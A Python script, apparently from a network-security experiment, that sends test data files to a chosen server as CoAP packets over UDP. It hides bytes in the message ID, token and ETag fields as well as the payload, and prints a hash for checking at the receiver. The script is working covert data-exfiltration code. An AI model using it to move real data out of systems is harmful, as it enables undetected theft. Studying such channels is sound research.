import scapy.contrib.coap as CoAP
from util.cborctl import CBORIterator, readFromFile
from hashlib import sha256
import argparse, ipaddress, sys, socket


parser = argparse.ArgumentParser()
parser.add_argument("-l", "--Length", type=int, help = "Length of data to exfiltrate (500 KB, 1, 5, 10 MB)")
parser.add_argument("-t", "--Target", help = "IP address of server to send exfiltration data to")
args = parser.parse_args()

size = int(args.Length)
if size not in [1,5,10,500]:
    print("Invalid exfiltration size!")
    sys.exit(1)

SERVER_IP = ""
try:
    ipaddress.ip_address(args.Target)
except ValueError:
    print("Invalid target server address!")
    sys.exit(1)

SERVER_IP = args.Target
PSIZE = 1470

print("\n====================CoAP EXFILTRATION====================\n")

if size == 500:
    content = readFromFile("data_05mb.json")
else:
    content = readFromFile(f"data_{size}mb.json")

print("Hash of CBOR-encoded content:\n" + sha256(content).hexdigest() + " (Check at receiver!)")
print("Length of payload bytestream: " + str(len(content)) + "\n")


itertor = CBORIterator(content)
packet_counter = 0
print("START sending packets")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Socket zum senden über UDP

while itertor.getRemainingLength() >= PSIZE:            # Payload aufteilen
    x = CoAP.CoAP(code=2, msg_id=int.from_bytes(itertor.getNextBytes(2), "big"), token=itertor.getNextBytes(15), paymark=b'\xFF')   # CoAP Packet erstellen
    x.options =  [("ETag", itertor.getNextBytes(4))]    # E-Tag option setzten (notwendig wegen Scapy bug)
    x /= itertor.getNextBytes(1447)                     # Payload

    sock.sendto(bytes(x), (SERVER_IP, 5683))
    packet_counter += 1
#    time.sleep(0.001)

# Übrige Bytes senden
x = CoAP.CoAP(code=2, msg_id=int.from_bytes(itertor.getNextBytes(2), "big"), token=itertor.getNextBytes(15), paymark=b'\xFF')
x.options =  [("ETag", itertor.getNextBytes(4))]
x /= itertor.getRemainingBytes()
sock.sendto(bytes(x), (SERVER_IP, 5683))

print("FINISHED sending packets")
sock.close()
packet_counter += 1
print("Last packet length: " + str(len(x)))
#print("Last packet:")
#x.show()
print("Packets sent: " + str(packet_counter))